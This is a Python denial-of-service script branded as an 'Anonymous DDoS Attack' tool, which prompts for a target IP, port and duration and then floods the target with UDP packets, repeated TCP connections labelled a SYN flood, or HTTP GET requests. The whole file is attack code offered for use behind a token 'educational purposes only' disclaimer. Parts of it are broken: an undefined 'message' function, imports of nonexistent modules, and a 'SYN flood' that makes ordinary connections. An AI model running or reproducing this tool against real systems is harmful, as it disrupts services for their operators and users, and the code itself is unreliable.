from termcolor import colored
from colorama import Fore, Back, Style
from os import system
from time import sleep
import urllib.request
from urllib.parse import *
import sys
import os
import time
import random
import platform
import pyttsx3
import proxys
import http, signal
import sock, socket
# Clear the terminal
os.system('cls' if os.name == 'nt' else"clear")
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()

#proxys = open('proxies.txt').readlines()
#bots = len(proxys)

print(Fore.GREEN)
if str(platform.system()) == 'Linux':
    os.system('figlet            Anonymous   DDoS Attack')
else:
    os.system('              pyfiglet Anonymous   DDoS Attack')
print(Fore.YELLOW + Style.BRIGHT +'                  Anonymous DDoS PHILIPPINES')
print(Fore.YELLOW + Style.BRIGHT +'                       Created by Mr.Hunt\n')
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We are Anonymous')
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We are a Legion')
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We do not Forgive')  
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                       We do not Forget')
print(Fore.LIGHTCYAN_EX + Style.BRIGHT +'                          Expect Us!')
print("")
print("")
print(Fore.RED + Style.BRIGHT +                       'THIS IS VERY POWERFULL DDOSING')
print(Fore.RED + Style.BRIGHT +                   'THIS IS FOR EDUCATIONAL PURPOSES ONLY')
print("")
print(Fore.BLUE + Style.BRIGHT +                         'You can use this tools')
print(Fore.BLUE + Style.BRIGHT +                  'but we are not responsible Any Damage')
print('Your OS:'+ Fore.YELLOW + str(platform.system())+Fore.GREEN)
print("\n")
# Prompt for target IP and port
ip = input("Enter the target IP: \x1b[38;5;226m")
try:
    port = int(input("\x1b[38;5;118mEnter the target port: \x1b[38;5;226m"))
except ValueError:
    print("Invalid port. Exiting...")
    sys.exit()

# Prompt for attack duration
try:
    dur = int(input("\x1b[38;5;118mEnter the duration of the attack in seconds: \x1b[38;5;226m"))
except ValueError:
    print("Invalid duration. Exiting...")
    sys.exit()

# Function to perform the UDP Flood attack


def udp_flood(ip, port, message, dur):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket so that the program doesn't get stuck
    s.settimeout(dur)

    # The IP address and port number of the target host
    target = (ip, port)

    # Start sending packets
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"\x1b[38;5;118mSent packet {packet_count}\x1b[38;5;0m")
        except socket.error:
            # If the socket is not able to send the packet, break the loop
            break

        # If the specified duration has passed, break the loop
        if time.time() - start_time >= dur:
            break

    # Close the socket
    s.close()

# Function to perform the SYN Flood attack
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"\x1b[38;5;118mSYN Packets sent: {sent} to target: {ip}\x1b[38;5;0m")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Attack stopped.")
            sys.exit()

# Function to perform the HTTP Flood attack


def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(dur)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Re-create the socket for each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"\x1b[38;5;118mHTTP Packets sent: {sent} to target: {ip}\x1b[38;5;0m")
        except KeyboardInterrupt:
            print("\n[-] Attack stopped by user")
            break
    sock.close()


# Prompt for the type of attack
attack_type = input(colored(
    "[Choose Number]\n[1.UDP 2.HTTP 3.SYN]: ", "red"))

if attack_type == "1":
    message("Sending 999999999 packets I need baby :(")
    print("\n\x1b[38;5;202mUDP attack selected")
    udp_flood(ip, port, message, dur)
    print("\n\x1b[38;5;202mUDP attack completed")
elif attack_type == "3":
    print("\n\x1b[38;5;202mSYN-FLOOD attack selected")
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print("\n\x1b[38;5;202mHTTP attack selected")
    http_flood(ip, port, dur)
else:
    print(colored("\nInvalid attack type. Exiting...", "green"))
    sys.exit()
